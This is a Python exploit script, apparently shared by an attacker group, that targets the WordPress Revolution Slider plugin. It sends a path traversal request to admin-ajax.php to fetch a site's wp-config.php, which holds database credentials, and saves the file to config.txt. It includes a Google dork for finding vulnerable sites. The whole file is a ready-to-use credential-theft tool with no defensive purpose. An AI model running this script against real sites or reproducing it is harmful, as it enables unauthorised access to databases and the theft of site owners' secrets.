#!/usr/bin/python
import urllib2,urllib,os,sys,re,subprocess
import requests as requests
from threading import Thread
import time
from subprocess import Popen, PIPE
import httplib,socket
print """
############################################################     
#   ____   __   __ _  ____    ____  ____  __ _  ____      #
#  (  _ \ /  \ (  ( \(    \  (  _ \(  __)(  ( \(__  )     #
#  ) _ ((  O )/    / ) D (   ) _ ( ) _) /    / / _/       #
#  (____/ \__/ \_)__)(____/  (____/(____)\_)__)(____)     #
#             Revslider Config Exploiter                  #
#                  1337Algeria                            #
#   Google Dork : inurl:/wp-content/plugins/revlisder     #
#    Facebook : https://www.facebook.com/0x55547987       #
#                                                         #
###########################################################                  
     """

if len(sys.argv)!=2:
 sys.stderr.write('[+]~ Usage : '+sys.argv[0]+' http://example.com/path \n ')
 sys.exit(1)

target = sys.argv[1] 
 
if 'http://' not in target:
	target= 'http://'+target

print'[#] Target : '  + sys.argv[1]

response = urllib2.urlopen(target+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
r = requests.get(target+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
html = response.read()

print "[+] Checking Target if Vulnerable"

if "DB" in html:
	print "[+] Target is Vulnerable"

else:
	print "[+] Target not Vulnerable"

if "DB" not in html:
	sys.exit(1)

f = open("config.txt", "w")
time.sleep(3)
print "[+] Writing Config ..."
time.sleep(4)
f.write(html);
print "[+] Writing Config File Success"
print "[~] File output : config.txt"
